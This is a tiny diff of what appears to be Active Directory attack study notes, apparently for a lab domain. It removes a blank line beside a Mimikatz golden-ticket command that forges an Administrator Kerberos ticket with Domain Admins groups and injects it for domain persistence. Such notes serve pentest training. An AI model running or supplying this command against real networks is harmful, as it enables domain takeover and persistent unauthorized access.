@@ -385,7 +385,6 @@ println "out> $sout err> $err"
 **On any machine**
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:<sid> /krbtgt:<krbtgt> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
-
 ```
 
 ## Domain Persistence Part 2
